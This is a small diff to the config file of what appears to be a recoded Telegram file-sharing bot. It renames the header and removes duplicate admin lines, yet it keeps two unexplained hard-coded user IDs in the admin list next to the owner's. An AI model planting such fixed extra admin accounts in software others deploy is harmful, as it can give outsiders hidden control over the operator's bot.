@@ -1,4 +1,4 @@
-# Yoona Girl Generation Muax
+# FileSharingBot
 # Recode by @IWasNotABot
 # t.me/TekanSiniLah & t.me/UnlimitedTrusted
 
@@ -64,8 +64,6 @@ DISABLE_CHANNEL_BUTTON = os.environ.get("DISABLE_CHANNEL_BUTTON", None) == "True
 
 ADMINS.append(OWNER_ID)
 ADMINS.append(299701677)
-ADMINS.append(299701677)
-ADMINS.append(1222949095)
 ADMINS.append(1222949095)
 
 
